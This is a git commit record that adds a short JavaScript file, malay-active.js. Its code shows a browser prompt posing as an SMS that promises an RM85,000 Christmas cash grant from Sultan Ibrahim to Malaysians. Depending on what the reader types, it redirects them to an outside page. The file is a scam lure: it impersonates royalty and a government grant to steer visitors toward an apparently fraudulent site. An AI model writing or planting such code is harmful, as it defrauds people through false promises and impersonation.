ee28ee28c5940fdce5914a8e8a1ee049d36d4ca7
boss-bloq <nsisboy01@gmail.com>
2024-12-14 07:20:34 -0800

    Create malay-active.js

---
+++ malay-active.js
@@ -0,0 +1,6 @@
+
+var password = 'KELUARKAN RM85,000'
+password=prompt('SMS: Tahniah Anda layak untuk KDYMM SULTAN IBRAHIM RM85,000.000 GERAN TUNAI KRISMAS UNTUK RAKYAT MALAYSIA, Sila Tekan OK untuk Mengeluarkan Geran Tunai X-MAS   ','KELUARKAN RM85,000');
+if (password != 'KELUARKAN RM85,000') {
+location.href='https://damba-fest.org/malaysia-grant.html';
+}
